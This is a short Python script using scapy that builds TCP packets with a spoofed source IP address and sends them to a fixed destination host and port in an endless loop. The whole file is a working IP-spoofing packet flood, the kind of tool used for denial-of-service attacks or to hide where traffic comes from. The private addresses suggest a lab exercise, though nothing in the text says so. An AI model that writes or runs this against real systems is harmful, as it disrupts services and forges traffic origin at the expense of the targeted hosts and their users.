from scapy.all import *

A = "192.168.1.254" # spoofed source IP address
B = "192.168.1.105" # destination IP address
C = 3000 # source port
D = 4000 # destination port
#payload = "" # packet payload
flag= 1
while True:
    spoofed_packet = IP(src=A, dst=B) / TCP(sport=C, dport=D) #/ payload
    send(spoofed_packet)